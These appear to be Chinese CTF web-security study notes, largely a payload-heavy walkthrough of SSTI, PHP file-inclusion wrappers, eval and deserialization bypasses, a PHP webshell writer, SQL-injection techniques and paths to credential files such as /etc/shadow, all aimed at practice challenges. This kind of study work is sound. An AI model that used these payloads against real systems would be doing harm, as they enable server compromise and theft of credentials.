# Bugku

## 常规解题思路

1. f12查看源码，通过Wappalyzer查看框架信息，特别注意注释内容的提示，如果没有信息再尝试抓包，查看响应的包内容，
2. 对题目的方向有所判断
3. 接着大致分为三个方向
   - 通过请求直接构建payload，或进行爆破从而进入下一步（SSTI，SQL等）
   - 抓包+修改请求类型绕过前后端检测（upload，页面参数限制）
   - 没发现什么，直接DirSearch扫描路径，注意429错误
4. 根据上一步获得的结果选择各种插件/字典辅助获得flag

## SSTI注入

SSTI就是模版注入，模版就是嵌入在html页面内，用于个性化展示用户信息或特定内容的一种引擎，比如可以通过分析接受到的get/post请求的内容，然后通过模版引擎不同的语法格式，展示在页面的指定部分

[题目](http://ctf.bugku.com/challenges/detail/id/196.html)及解题思路：

1. 若题目没有告诉你运用的是什么模版引擎，则可以利用`Wappalyzer`直接分析，根据每一个模版引擎的语法构建不同的payload

2. 尝试简单的语法，查看页面返回的结果是否有区别

   ![image-20220125132423370](https://s2.loli.net/2022/01/25/1s2OzFvwQHMKPat.png)

   会发现在页面的相应地方可能会出现9或之类的数字

3. 进行注入，可以借助[别人整理好的字典](https://github.com/payloadbox/ssti-payloads)的帮助，放进burpsuite里面直接intruder暴力解决即可

   > 注意到burpsuite的爆破模式可以在Options下对响应结果进行筛选，而简单的爆破只需要按照返回结果html字符长度判断即可
   >
   > ![image-20220125133701424](https://s2.loli.net/2022/01/25/CgFlbG3daQ2Uy84.png)

4. 自定义系统指令拿到flag

## Flask文件上传

接上文，Flask就是一个利用Python编写的模版引擎，因此在一些情况下或许可以通过上传python文件的方式或许可以让后台执行python文件从而达到获取计算机内文件的目标

## 写入文件二次返回

控制台指定命令且部分参数可控，可以通过`[参数] | ls />test`绕过，并将结果存储在网站目录下test文件，直接访问`proxy/test`即可查看执行命令之后结果

## 松散比较

![image-20220202204920632](https://s2.loli.net/2022/02/02/JbfWzRrHcXL94ew.png)

其中`0==.`也成立

![image-20220202205245341](https://s2.loli.net/2022/02/02/XQrkBMmO4PvNRZT.png)

## 代码审计

### `var_dump()/eval()`

```php
<?php
    include "flag.php";
    $a = @$_REQUEST['hello'];
    eval( "var_dump($a);");
    show_source(__FILE__);
?>
```

如此则通过构建`?hello=);system( 'cat flag.php'`绕过（拆分括号法+执行系统命令）

### `$$/GLOBALS`

```php
<?php  

error_reporting(0);
include "flag1.php";
highlight_file(__file__);
if(isset($_GET['args'])){
    $args = $_GET['args'];
    if(!preg_match("/^\w+$/",$args)){
        die("args error!");
    }
    eval("var_dump($$args);");
}
?>
```

其中`$$`是将变量的内容作为变量读取该变量中的内容

而`GLOBALS`可以查看PHP中的所有变量信息

直接构造`args=GLOBALS`即可（读取变量）

![image-20220130193822439](https://s2.loli.net/2022/01/30/DfWOv49x6crlU1K.png)

### `eregi([参数1],[参数2])`

其中参数1是一个正则表达式，参数二是目标字符串，返回布尔值，一般用来判断字符串是否符合要求（比如是否为8位密码等）

因此不要求前后两个相等，以此制定绕过规则

### 文件包含

文件包含，顾名思义就是在页面中动态的包含了其他的比如文件内容，网页内容，在实际开发中十分常用，可以帮助开发者减少很多无谓的工作，但是使用不当则会给黑客有机可乘

文件包含题目最明显的特征就是我们可以通过传参控制在页面上显示的内容，对于PHP具体来说最明显的特征就是存在`include/require(变量)`的代码块，且其中的变量是可控的

同时注意文件包含的另一个目的就是获取网站的源码内容，方便我们的代码审计

#### `php://input`

​	`php://input`可以看做和`$_POST[]`差不多，只是面对某些不同类型的传参时表现的内容不太一样，比如如下的代码块

```php
<?php
$file = $_GET["file"];
if ($file) {
    include($file);
} else {
    echo "指定file";
}
```

当我们传入`?file=php://input`时，程序会等待一个post请求，如果post请求为一段php代码，程序也会对其执行，从而达到了注入的目的

> 注意Chrome上的HackBar会抽风，建议自己手动构造POST请求

除了`include`之外，如果遇到`file_get_contents`也要想到`php://input`

常见poc（通过post传入）：

- `<?php system("dir");?>`
- `<?php fputs(fopen('shell.php','w'),'<?php @eval($_POST['cmd'])?>');?>`

#### `php://filter`

`php://filter`可以获得指定文件的源码或是源码经过编译之后的密码，避免服务器自动编译某些文件导致丢失比如注释等信息，有助于我们进行代码审计或是获得flag

常用POC：

- `?file=php://filter/read=convert.base64-encode/resource=xxx.php`

#### `zip:// phar://`

`zip://`可以访问zip压缩包内的文件，并可以自定义后缀名，这提醒我们可以通过别的方式将敏感文件进行压缩并且更改后缀防止识别之后上传，再跟据`zip://`来执行压缩文件内的文件内容

不过注意zip后的路径必须为绝对路径

常用POC：

- `?file=zip://[绝对路径zip]%23[压缩包内文件名]`
- `?file=phar://[绝对路径/相对路径zip]%23[压缩包内文件名]`

#### `data://`

`data://`可以将之后的内容格式化后作为输入流，有点类似`php://input`，同样也会解析其中的php代码并执行，并且可以对传入的数据进行编码，固定格式为`data://[<mime>][;charset=<encoding>][;base64],<data>`

常用POC：

- `?file=data://,<?php phpinfo();`
- `?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOw==`

#### Session包含

比如包含本机的session，为了定制个性化的页面，我们看到的php页面中往往会包含`$_SESSION[]`获取session值的内容，而部分Session的值我们可能是可控的，比如我们可以注册一个含有木马的用户名，服务器按道理将我们的用户名也存入了Session中，此时如果我们可以直接读取Session文件，那么服务器也会将其中的部分php代码进行解析，从而达到注入的目的

Session常见路径：

- `/var/lib/php/sess_PHPSESSID`
- `/tmp/sess_PHPSESSID`
- `/tmp/sessions/sess_PHPSESSID`

#### UA绕过

PHP目录下的`proc/self/environ`会保存`user-agent`头，如果在其中写入php代码，包含该文件的时候就可以被解析从而达到注入效果

不过注意仅当php以cgi方式运行的时候才会保持UA头

### eval判断/短标签

就算是eval存在于判断中，但是里面的语句还是要先执行了得先，因此我们或许不需要管到底判断了什么东西，直接输出我们需要的东西即可

```php
<?php
    error_reporting(0);
    require __DIR__.'/flag.php';

    $exam = 'return\''.sha1(time()).'\';';

    if (!isset($_GET['flag'])) {
        echo '<a href="./?flag='.$exam.'">Click here</a>';
    }
    else if (strlen($_GET['flag']) != strlen($exam)) {
        echo '长度不允许';
    }
    else if (preg_match('/`|"|\.|\\\\|\(|\)|\[|\]|_|flag|echo|print|require|include|die|exit/is', $_GET['flag'])) {
        echo '关键字不允许';
    }
    else if (eval($_GET['flag']) === sha1($flag)) {
        echo $flag;
    }
    else {
        echo '马老师发生甚么事了';
    }

    echo '<hr>';

    highlight_file(__FILE__);
```

在其中一条中看到了eval，那么它就是我们获取flag的关键，只需要因此eval后面的内容都不用看了，直接对前面的检查进行绕过即可，反正执行到eval就会输出我们想要的

构造`?flag=$a=%27blag%27;$a{0}=%27f%27;?>11111111111111111;<?=$$a;?>`

- Get请求只通过&分隔，后面的一大串都能变成flag的值
- flag在变量里，不需要调用系统文件，同时也检查了`/`因此可以先不考虑文件包含
- 排除了`[]`就用`{}`，排除了flag就自己定义变量构造，连接符`.`被排除了就用数组替换
- `<?= ?>`相当于`<?php echo ""?>`可以绕过php、echo单词检查

### 正则表达式

- `[[:punct:]]`表示任何标点符号（字符簇），但是某些测试工具并不支持，就离谱
- `()`是分组信号，事实上没什么卵用
- `a{2,4}`表示匹配a字符最少一次最多四次
- `*`和`?`表示的是前面的那个字符的若干次u，并不是任意字符，和文件搜索不一样
- `:`冒号一般来说没什么意义

### 反序列化漏洞

序列化是将对象的状态信息转换为可以存储或传输的形式的过程。在序列化期间，对象将其当前状态写入到临时或持久性存储区。以后，可以通过从存储区中**反序列化对象**的状态，重新创建该对象。

对于php来说，直接提供了一个`serialize`函数，专门用于序列化已经实例化好了的对象，而`unserialize`函数专门用来还原序列化好了的对象，此时如果`unserialize`函数的内容可以被我们控制，那么我们就可以自己构造一个序列化对象给他反序列化，因此反序列化漏洞需要满足的条件有

- 包含`unserialize`函数，且参数可控
- 已知某一个类对象的定义内容
- 对象内，尤其是魔术方法中的内容包含注入点

比如以下代码：

```php
<?php

header("Content-Type: text/html;charset=utf-8");
error_reporting(0);
echo "<!-- YmFja3Vwcw== -->";
class ctf
{
    protected $username = 'hack';
    protected $cmd = 'NULL';
    public function __construct($username, $cmd)
    {
        $this->username = $username;
        $this->cmd = $cmd;
    }
    function __wakeup()
    {
        $this->username = 'guest';
    }

    function __destruct()
    {
        if (preg_match("/cat|more|tail|less|head|curl|nc|strings|sort|echo/i", $this->cmd)) {
            exit('</br>flag能让你这么容易拿到吗？<br>');
        }
        if ($this->username === 'admin') {
            // echo "<br>right!<br>";
            $a = `$this->cmd`;
            var_dump($a);
        } else {
            echo "</br>给你个安慰奖吧，hhh！</br>";
            die();
        }
    }
}
$select = $_GET['code'];
$res=unserialize(@$select);
```

同时注意对于某个序列化对象来说，类的方法实际上是不重要的，因此只需要注意类中的属性即可，我们可以在本地构建相同代码，然后执行序列化来获得传入参数内容

```php
$select = new ctf("admin", "ls");
echo urlencode(serialize($select));
```

> 因为protected属性的前缀标志是`%00*%00`如果通过直接查看不能看见，必须编码一下

得到内容：

```php
O%3A3%3A%22ctf%22%3A2%3A%7Bs%3A11%3A%22%00%2A%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A6%3A%22%00%2A%00cmd%22%3Bs%3A2%3A%22ls%22%3B%7D
```

解码一下自己添加`%00`得到

```php
O:3:"ctf":2:{s:11:"%00*%00username";s:5:"admin";s:6:"%00*%00cmd";s:2:"ls";}
```

然后已知在反序列化的时候会先执行`__wakeup()`方法，因此为了不让我们的username属性被改了，我们得绕过他，***当成员属性数目大于实际数目时可绕过wakeup方法(CVE-2016-7124)***

同时虽然过滤掉了一堆东西，但是没有过滤`tac`，可以用他获取文件内容，同时还注意到修改指令之后还需要把`s:?`长度修改了，不然反序列化之后也是无效的

最终构造

```php
?code=O:3:"ctf":3:{s:11:"%00*%00username";s:5:"admin";s:6:"%00*%00cmd";s:12:"tac+flag.php";}
```

#### 字符逃逸

学习了序列化的原理之后，现实中的题目显然不会像这一样简单，这时候就需要进行进一步的学习，其中就包括了反序列化的字符逃逸，以下是会发生的条件

- 源代码涉及到序列化结果的更改部分，且更改结果会影响原串长度
- 序列化参数可控且不过滤`"`、`}`等
- php版本较低，存在字符逃逸的漏洞
- 序列化类中存在两个不同属性，且至少一个可控
- 同时要符合前文说过的条件

反序列化字符逃逸漏洞分为增长漏洞和缩短漏洞，以下为样例

1. 串增长，比如有以下程序

   ```php
   <?php
   function filter($string){
     $a = str_replace('x','zz',$string);
      return $a;
   }
   
   $username = "tr1ple";
   $password = "aaaaax";
   $user = array($username, $password);
   $r = filter(serialize($user));
   var_dump(unserialize($r));
   ```

   已知有一个函数`filter()`可以将序列化中的一个`x`变成两个`z`，此时如果我们想让为这个数组添加一个额外的属性（比如添加属性123456），那么我们就需要构造字符逃逸串

   不妨让`username=tr1plexxxxxxxxxxxxxxxxxxxx";i:1;s:6:"123456";}`，`password`为不含x的项，那么经过构造，我们发现username的长度为45，x有20个，那么序列化并经过`filter`函数之后原串会变

   ```php
   a:2:{i:0;s:45:"tr1ple+40*'z'";i:1;s:6:"123456";}i:1;s:5:"aaaaa";
   ```

   会发现多出来的z部分把原本的第二个属性给挤出去了，改变之后的串在反序列化的时候会只读取第一个符合规则的（即`{}`为止），那么后面的内容就自然而然被省略了，也就完成了我们的属性注入

2. 串缩短，比如有以下程序

   ```php
   <?php
   class evil{
       public $cmd;
   
       public function __construct($cmd){
           $this->cmd = $cmd;
       }
   
       public function __destruct(){
           system($this->cmd);
       }
   }
   
   class User
   {
       public $username;
       public $password;
   
       public function __construct($username, $password){
           $this->username = $username;
           $this->password = $password;
       }
   
   }
   
   function write($data){
       $data = str_replace(chr(0).'*'.chr(0), '\0\0\0', $data);
       file_put_contents("dbs.txt", $data);
   }
   
   function read(){
       $data = file_get_contents("dbs.txt");
       $r = str_replace('xx', 'y', $data);
       return $r;
   }
   
   if(file_exists("dbs.txt")){
       unlink("dbs.txt");  
   }
   
   $username = "\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0";
   $password = "A";
   $payload = '";s:8:"password";O:4:"evil":1:{s:3:"cmd";s:6:"whoami";}'; write(serialize(new User($username, $password.$payload))); var_dump(unserialize(read()));
   ```

   原理和上述一样，目的是创建一个evil类通过其构造方法执行系统指令，注意`\0`代表两个字符，那么`read`函数就把六个字符变成了三个字符，达到了字符逃逸的需求

   如上述构造payload，我们发现`username`为48位，`password`为56位，那么序列化后内容为

   ```php
   O:4:"User":2:
   {s:8:"username";
    s:48:"yyyyyyyyyyyyyyyyyyyyyyyy";s:8:"password";s:56:"A";
    s:8:"password";
    O:4:"evil":1:{s:3:"cmd";s:6:"whoami";}
    ";}
   ```

   发现原本的username属性把后面的内容吃掉了一部分，然后剩下的直接将User的password属性变成了evil类，可谓是十分精妙

## 头信息构建绕过

### 验证位检查

有些时候会发现单修改参数服务端并不认你这个参数，这时候我们需要在请求中寻找一下是否有验证位存在，一般都是通过某些加密算法自动生成的，我们只需要对我们构建的内容进行一次加密，作为验证位的值传入即可

> base64的密文中常常包含`=`，Unicode则一般会出现`%`等等

### 服务器ip过滤

有时会遇见服务端进行访问者的ip检查，此时我们就需要伪造自己的访问ip，也就是利用XFF技术

> **X-Forwarded-For**(**XFF**)是用来识别通过HTTP代理或负载均衡方式连接到Web服务器的客户端最原始的IP地址的HTTP请求头字段。通俗来说，就是浏览器访问网站的IP。一般格式：
>
> ```
> X-Forwarded-For: client1, proxy1, proxy2, proxy3
> ```
>
> 左边第一个是浏览器IP，依次往右为第一个代理服务器IP,第二个，第三个（使用逗号+空格进行分割）

在burpsuite中，我们可以在Repeater模块右方找到快速添加请求头参数的模块

![image-20220129112024152](https://s2.loli.net/2022/01/29/Ept6ymvnJxUru1S.png)

即实现了伪装访问ip的目的从而可以获取比如仅有管理员能够访问的web页面

## md5绕过

### `0e`弱类型绕过

0e被php当作0的x次方比较，自然判断是相等的

- QNKCDZO
- 240610708
- s878926199a
- s155964671a
- s214587387a
- s214587387a

### 数组绕过

- `a[]=a&b[]=b`

除此之外，`strcmp()`也可以通过数组绕过（判断两个字符串是否相等，相等返回0）

### 强类型绕过

- `a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2
  &b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2`

### 弱类型等于自身

- `0e215962017`

## 原型链污染

JavaScript的对象的继承关系不如别的语言一样严格，由于原型链这种特殊的存在，使得出现了很多骚操作，比如子类甚至能直接修改父类的属性，从而间接新增了同类的属性，这也就为原型链污染提供了方便

```javascript
// foo是一个简单的JavaScript对象
let foo = {bar: 1}

// foo.bar 此时为1
console.log(foo.bar)

// 修改foo的原型（即Object）
foo.__proto__.bar = 2

// 由于查找顺序的原因，foo.bar仍然是1
console.log(foo.bar)

// 此时再用Object创建一个空的zoo对象
let zoo = {}

// 查看zoo.bar
console.log(zoo.bar)

```

如上图所示，我们就完成了对Object属性的注入，而又因为Object是所有类的默认父类，那么我们的其他类莫名其妙就有了一个本不属于他的属性

容易出现原型链污染的情况最明显的特征就是某个比如数组的取项是我们可控的，比如`arr[a][b]`，那么我们就要产生警惕，不妨令`a=__proto__`那么这个类的父类Object就莫名其妙多了一个b属性了

还有比如（一个递归合并的程序）：

```javascript
function merge(target, source) {
    for (let key in source) {
        if (key in source && key in target) {
            merge(target[key], source[key])
        } else {
            target[key] = source[key]
        }
    }
}
```

一旦source和target可控，我们的也会自然想到原型链的污染，比如：

```javascript
let o1 = {}
let o2 = JSON.parse('{"a": 1, "__proto__": {"b": 2}}')
merge(o1, o2)
console.log(o1.a, o1.b)

o3 = {}
console.log(o3.b)//2
```

注意JSON.parse不能省去，如果省去的话javascript会认为`o2`父类为后面这个花括号，而不是`o2`这个类里面的一个属性`__proto__`，这意味着之后的遍历不再会比较`__proto__`这个key

看到题目：

```javascript
const Admin = {
    "password":process.env.password?process.env.password:"password"
}


router.post("/getflag", function (req, res, next) {
    if (req.body.password === undefined || req.body.password === req.session.challenger.password){
        res.send("登录失败");
    }else{
        if(req.session.challenger.age > 79){
            res.send("糟老头子坏滴很");
        }
        let key = req.body.key.toString();
        let password = req.body.password.toString();
        if(Admin[key] === password){
            res.send(process.env.flag ? process.env.flag : "flag{test}");
        }else {
            res.send("密码错误，请使用管理员用户名登录.");
        }
    }

});
router.get('/reg', function (req, res, next) {
    req.session.challenger = {
        "username": "user",
        "password": "pass",
        "age": 80
    }
    res.send("用户创建成功!");
});

router.get('/', function (req, res, next) {
    res.redirect('index');
});
router.get('/index', function (req, res, next) {
    res.send('<title>BUGKU-登录</title><h1>前端被炒了<br><br><br><a href="./reg">注册</a>');
});
router.post("/update", function (req, res, next) {
    if(req.session.challenger === undefined){
        res.redirect('/reg');
    }else{
        if (req.body.attrkey === undefined || req.body.attrval === undefined) {
            res.send("传参有误");
        }else {
            let key = req.body.attrkey.toString();
            let value = req.body.attrval.toString();
            setFn(req.session.challenger, key, value);
            res.send("修改成功");
        }
    }
});
```

在第15行我们看到，要让`Admin[key]`和传入的password相等才会输出，然而在第一行定义的时候居然没有定义Admin的key属性，既然Admin继承Object父类，那我们直接在修改参数的时候给Object添加一个key属性即可

## 数据库约束漏洞

SQL不止能注入，有时候可以通过一些更加简单的方法进行攻击

比如当用户名检查较为宽松时，就让约束漏洞有机可乘，需要满足的条件有

- 帐号通过varchar限制长度
- 数据库通过`SELECT * FROM * WHERE username=* and password=*`查找用户信息
- 帐号允许存在空格
- 已知管理员的帐号名称

此时就可以重新注册一个帐号，前缀利用管理员的帐号后面添加空格直到溢出varchar值，再在最后添加任意值，此时前后端都会先判断这个内容是否存在于数据库中，由于最后包含任意值，因此数据库比较时不会略去中间的空格，但是添加进去的时候又走了varchar，经过裁剪之后才添加入库，接着我们会发现如果单查找管理员用户名的话我们设定的用户名和系统内的管理员帐号两条记录都会筛选出来（因为忽略空格），此时如果我们指定为自己设定的密码，那么前端会告诉后端登录的即是管理员帐号，但是查找登录的验证却变成了我们自己设定的用户

## SQL注入简单流程

1. admin判断回显，注意错误信息
2. 尝试闭合，观察不同输入输出结果
3. 枚举函数推导过滤内容，判断注入类型，构造payload
4. 编写脚本，进行爆库

## ZipArchive删除内容

php内置类ZipArchive可以删除删除一个文件，当出现某个属性`class->open(file,arg)`方法且`class`和`arg`可控时（比如通过反序列化得到），那么我们可以令`class`为ZipArchive类，`arg`为8，即可删除指定file文件

`ZipArchive :: open（$filename, $flags = null）`这是这个类的原型方法

## 杂项

- `preg_match("/\\|/g",$para)`先转义php语法`\\｜`变为`\｜`，再执行正则表达式语法，剩下一个`|`
- 有时候我们遇到返回页面空白的情况，事实上可以查看一下返回信息，比如`<?php $key="flag{flag_here}"; ?>`的内容在页面上是不显示的（自动渲染了），这和网页注释很不一样，很容易被忽视
- 当html文件内包含重定向的时候页面一下就跳走了，这时候我们就可以通过在URL前加上`view-source:`来只查看该页面的源码
- `post`传入值时，在python中应以字典形式作为参数传入，如`se.post(url=url, data={'value':1})`
- 当浏览器向web服务器发送请求的时候，在请求头内一般会带上`Referer`，告诉服务器我是从哪个页面链接过来的，服务器基此可以获得一些信息用于处理。
- 文件上传的时候数据和前面的标头需要空一行。。

# 从零到一

## 敏感目录泄露

不合理的网站排除规则会使得网站泄露某些敏感内容，尤其是某些代码构建工具或者版本控制工具的配置目录，一旦泄露我们就可以通过特定的工具对其进行分析，最终可以获取到网站的源码，从而进行进一步的网站挖掘

### Git泄露

对于git泄露，有时候我们会遇到服务端拒绝你访问`.git`目录（如[书本例题](https://buuoj.cn/challenges#[%E7%AC%AC%E4%B8%80%E7%AB%A0%20web%E5%85%A5%E9%97%A8]%E7%B2%97%E5%BF%83%E7%9A%84%E5%B0%8F%E6%9D%8E)），但是这并不妨碍某些工具的提取git内容（因为比如`.git/config`可以访问），在尝试了多个工具之后，[Git_Extract](https://github.com/gakki429/Git_Extract)和[GitHack](https://github.com/lijiejie/GitHack)都还不错，原项目都是只用python2才能运行，然而我也找到了python3的[fork版](https://github.com/tigert1998/GitHack-py3)，可谓是吊打什么GitHacker（~~书上的两个工具就没成功过~~）

---

此外，当我们能够顺利拿到`.git`目录时，我们想查看历史版本的信息，最可靠的还是`git reflog`可以直接列出这个git项目创建以来所有的改动内容，相反什么`git log`事实上还是会出现某些记录经过reset之后丢失的情况，详细可以百度一下，[如](https://blog.csdn.net/chenpuzhen/article/details/92084229)

注意到每个commit事实上都对应着一个hash，只需要找到目标commit的hash值，`git reset/git show/git diff`加该值即可回退或查看差别内容

### 其他泄露

- SVN泄露会存在`.svn/entries`或`wc.db`
- HG泄露会存在`.hg`文件

## SQL注入

注入存在于两种场景之下

第一种是网站中存在个性化展示页面，但是展示页面的内容来自于数据库且可控（比如随着我们传入参数的不同【id】显示不同内容），此时我们就可以尝试注入并且获取该数据库的其他表内容，且这种注入方式一般都有回显显示，直接使用`union`包含相对较为容易

第二种是存在于登录框的注入，此时往往账户密码都在同一表中，但相对来说过滤将会更为严格，同时最多仅有用户名密码输入错误显示，根据回显的有无或者执行语句的时间，往往需要进行盲注测试过滤然后构造脚本爆破，相对比较麻烦

### 平台搭建

为了能够进行正常的注入，我们理应在本地搭建一个环境先

1. `docker run --name mysqlt -e MYSQL_ROOT_PASSWORD=123456 -d -i mysql:latest`启动容器

2. 进入php容器`docker-php-ext-install mysqli`，`docker-php-ext-enable mysqli`之后重启服务

3. 进入mysql容器`mysql -uroot -p`，输入密码123456

4. 创建库`test_sql_inj`和表`user_info`，内容如下

   ![image-20220226113343883](https://s2.loli.net/2022/02/26/HtPjN67eJlFGYDg.png)

5. 编写php内容

   ```php
   <?php
   $conn = mysqli_connect("172.17.0.4", "root", "123456", "test_sql_inj");
   $res = mysqli_query($conn, "select username,password from user_info where id=" . $_GET['id']);
   $row = mysqli_fetch_array($res);
   echo "<center>";
   echo "<h1>" . $row['username'] . "</h1>";
   echo "<h1>" . $row['password'] . "</h1>";
   echo "</center>";
   ```

6. 接着我们就可以在页面上根据传入的`id`来读取数据库

### 常用指令

- `information_schema.tables`数据库所有表信息，其中`table_schema`是表所属的数据库名称，`table_name `是表名，与此类似的`information_schema.columns`存储了所有字段信息，除了前面提到的字段之外，还有`column_name`表示字段名

  > 可以使用`select table_schema,table_name,column_name from information_schema.columns where table_schema=database();`当我们不知道这个 数据库中有哪些字段时

- `group_concat()`将多个结果合并成一个字符串，中间用`,`分隔，与此类似的`concat()`可以拼接多个字符串内容

- `substring/mid/substr([string],[num1],[num2])`三个函数功能差不多，都是截取某个字符串从`[num1]`开始`[num2]`位的内容

- `updatexml(1,[指令],1)`可以在报错中执行第二个参数指定的指令

- PHP里的`addslashes(string)`会对字符串中奇怪的比如引号添加转义`\`防止被利用

### 注入方式

SQL注入的第一步就是判断注入方式，通常有数字型、字符型、报错型三种方式，因此注入首先要通过简单的指令对其进行探测以判断

#### 数字型注入

范例：`"select username,password from user_info where id=" . $_GET['id']`

特点就是获取GET请求的参数时未用引号包裹，此时`$_GET['id']`将作为数字类型与前面字符串进行拼接，即`id=1`

探测方式是使用类似`?id=2-1`的方式来查看回显是否与`?id=1`相同，如果相同说明为数字型注入

数字类型注入十分简单，直接在参数后加上注入内容即可`?id=1; [注入语句]`

#### 字符型注入

范例：`"select username,password from user_info where id='" . $_GET['id']."'"`

即在数字型的基础上为请求参数加上了引号，此时查询语句为`id='1'`，但由于sql会自动将字符`'1'`转换为数字`1`再去表中寻找记录，因此对数据库查询来说并不影响

探测方式是传入`?id=1a`，sql在字符串转数字时会自动忽略后面的`a`从而与`?id=1`回显相同

对于字符型注入，我们常用闭合引号的方式注入，注意要先判断应该闭合的是单引号还是双引号，之后在注入语句最后添加`#`注释掉原本的引号即可

例如构造`?id=1'[注入语句]%23`，注意有些浏览器不支持直接输入`#`，保险起见最好使用url编码`%23`

#### union包含

在注入语句的选择上，假设我们可以看到查询结果，那么想都不想直接使用`union`包含我们自己的语句即可，如以下payload

`?id=-1 union select * from user_info`或先通过内置表查询表名即可

#### 布尔盲注

假设我们无法直接看到查询的返回结果，但不是完全看不见，只是返回信息比较模糊（比如提示您的xx输入不对），此时就需要进行盲注了，比如我们可以通过构造以下payload

`?id=-1 or (select mid((select concat(user," ",pwd) from table),1,1))='a'`接着通过修改最后`'a'`的值和前面`mid`函数的第二个参数，判断回显从而进行盲注

#### 时间盲注

如果我们什么东西都看不见，那么就需要使用时间盲注了，我们可以先通过比如`?id=1 or sleep(1)`来看看页面是不是会卡一下，如果成功说明存在时间盲注注入点，我们就可以构造比如

`?id=-1 or if((select mid((select concat(user," ",pwd) from table),1,1))='a',sleep(2),1)`之类

#### 报错注入

范例：`mysqli_query(...) or var_dump(mysqli_error(...))`

探测方式是在进行前两种方式探测的时候出现了奇怪的一长串内容，我们可以利用报错信息包含我们需要的内容进行注入

对于报错注入，我们只需要利用好sql内置的报错函数即可

例如构造`?id=1 or updatexml(1,[注入语句],1)`即可

### 其他注入点

我们会发现上面所示的代码注入位置都是一样的，即`WHERE`后通过改变筛选条件来实现注入，实际当中，环境远比之复杂不少，我们需要根据实际情况进行判断

#### SELECT

- 假设SQL语句是这样的`select $_GET['id'] from table`或`select title from $_GET['id']`，且我们发现后面调用显示的内容比如是`echo $arr["title"]`，那么我们就可以使用as别名的方式进行注入

  `?id=(select pwd from user) as title`即可，对于后一种来说，这样嵌套的方式对于SQL语句来说也是正确执行的，且title下即为我们所需要的`pwd`值

- 假设SQL语句是这样的`select title from table group by $_GET['id']`，其中`group by`后面可以根据比如`id desc`对id进行降序排序，那么我们可以构造比如

  `?id=id desc,if([注入语句],sleep(1),1)`进行时间注入

#### 其他语句

大多数注入都在查询语句中，最重要的一点是通常的业务逻辑对于查询语句都或多或少会在页面进行回显，但是我们并不能一口咬定不会出现其他SQL语句的注入

- 对于`insert into user_info values(1,0,'$_GET['id']');`，且我们已知前面的`0`参数表示成员身份而`1`表示管理员，那么我们就可以直接构造比如

  `?id=1'),(2,1,'a`即可添加多条记录，接着我们通过后面的管理员帐号登录即可

- 对于`delete from table where id=$_GET['id']`，由于`delete`如果出现`where`后面内容为true就会把整个库给删了，为了避免这种错误，我们可以使用`?id=1 and sleep(1)`的方式保证为False

### 绕过积累

- `%0a %0b %0c %09 %a0`都是空格字符，可以绕过`" "`黑名单

- 单次`str_replace("SELECT","",$str)`，可以构造`SESELECTLECT`之类绕过

- 如果只匹配了大小写`select`，可以直接`SeLect`之类绕过（因为SQL语句不区分大小写）

- `where id='[1]' and title='[2]'`，假设没有滤过`\`，那么我们可以让1等于`a\`，2等于`or sleep(1)#`，这样可以让1的前引号和2的前引号闭合，从而闭合引号

- 允许我们对数据库进行添加数据时，同时忘记对存入内容进行过滤（比如允许用户名包含`'`但是会加上转义），那么我们可以存入比如`admin'or'1`，再次调用查询语句的时候SQL就会上当，直接变成`where 'admin'or'1'`从而直接登录管理员

- php代码中对输入内容进行截取前几位，且使用了转义，那么比如输入`aaaaaaaaa'`就会被转义为`aaaaaaaaa\'`，又因为比如只允许10位，最终变成`aaaaaaaaa\`，此时就可以逃逸出一个引号，从而执行注入内容，比如

  ```php
  <?php
  $title = substr(addslashes("aaaaaaaaa'"), 0, 10);
  $content = ",1,1),(3,4,(select pwd from user limit1),1)#";
  $sql = "insert into user values(2,'$title','$content')";
  ```

  则最后`$sql="insert into user values(2,'aaaaaaaaa\',',1,1),(4,4,(select pwd from user limit1),1)#')"`从而注入两个数据段

## 文件读取

文件包含的相关内容可以查看之前写过的内容，此处我们补充一些额外的内容

### 服务器敏感目录

- `../../../../../../../../../flag`九连回退到根目录
- `/etc/passwd`读取服务器用户和组信息
- `/etc/shadow`读取服务器上用户的密码加密后内容，如果有权限可以对指定用户进行清空密码从而实现登录
- `/etc/apache2/*`、`/etc/nginx/*`、`/etc/apparmor(.d)/*`、`/etc/mysql/*`、`/etc/php/*`、`/usr/local/nginx/conf`都是各个软件的配置文件地址，通过他们我们可以进行进一步的数据挖掘
- `/etc/cron.d/*`存放了定时任务的shell文件，或许可以发现一些隐藏文件
- `/etc/enviroment`、`~/.bashrc`可以看到服务器的环境变量信息，存在大量目录信息的泄露
- `/etc/hosts`探测网卡信息和内网ip域名
- `/proc`是一个虚拟目录，控制中心，我们可以通过修改其中某些文件的内容改变内核的状态，同时内部的数字文件夹就代表着当前电脑运行的所有进程pid，当我们知道某个进程的pid时，进入到内部目录，可以通过`cat cmdline`的方式获取运行该进程时运行的命令，这个文件夹下记录了每个进程相关所有的内容，如果可以访问是十分重要的，详细内容可以查阅资料

### 实际应用相关

#### HCTF 兵者多诡

环境准备：题目有上传入口，但是白名单限制死了`.png`文件，同时注意到多数网页包含`file`的get参数（比如展示上传图片时有`?file=show`，则可以猜测存在`show.php`文件），并且我们知道上传文件的目录在哪，猜测存在`file`相关的文件包含漏洞

1. 测试`?file=./show`，判断是否存在任意文件包含漏洞
2. 本地将webshell放在`1.php`文件中，打包成`zip`文件，之后改后缀为`.png`上传
3. `?file=zip://uploads/[img_name].png%231&shell=phpinfo();`
3. 其中zip伪协议可以通过`#(%23)`指定访问压缩文件中的某个文件

#### PWNHUB-classroom

碰到Python题目没有给源码的情况下，第一时间尝试是否存在目录穿越漏洞，一般是六/七`../`测试，可以尝试读取比如`etc/passwd`文件

